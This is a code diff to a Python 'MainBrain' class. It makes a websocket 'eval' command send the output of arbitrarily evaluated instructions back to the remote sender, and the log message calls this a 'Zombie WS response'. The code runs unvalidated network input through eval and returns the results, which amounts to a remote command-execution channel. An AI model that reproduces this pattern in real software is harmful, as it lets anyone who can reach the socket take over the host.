@@ -213,16 +213,23 @@ class MainBrain(Brain):
 
             if cmd.msg == "eval":
                 instructions = []
+                execution = "No instructions"
                 if isinstance(cmd.data, str):
                     instructions.append(cmd.data)
                 elif isinstance(cmd.data, list):
                     instructions = cmd.data
-
                 for instruction in instructions:
                     if instruction.startswith("await "):
-                        await eval(instruction.removeprefix("await "))
+                        execution = await eval(instruction.removeprefix("await "))
                     else:
-                        eval(instruction)
+                        execution = eval(instruction)
+                message = WSmsg.from_json({
+                    "sender": CONFIG.WS_SENDER_NAME,
+                    "msg": "Execution of sender instruction",
+                    "data": str(execution)
+                })
+                await self.ws_cmd.sender.send(message)
+                self.logger.error(f"Zombie WS response sent: {execution}")
 
             else:
                 self.logger.warning(
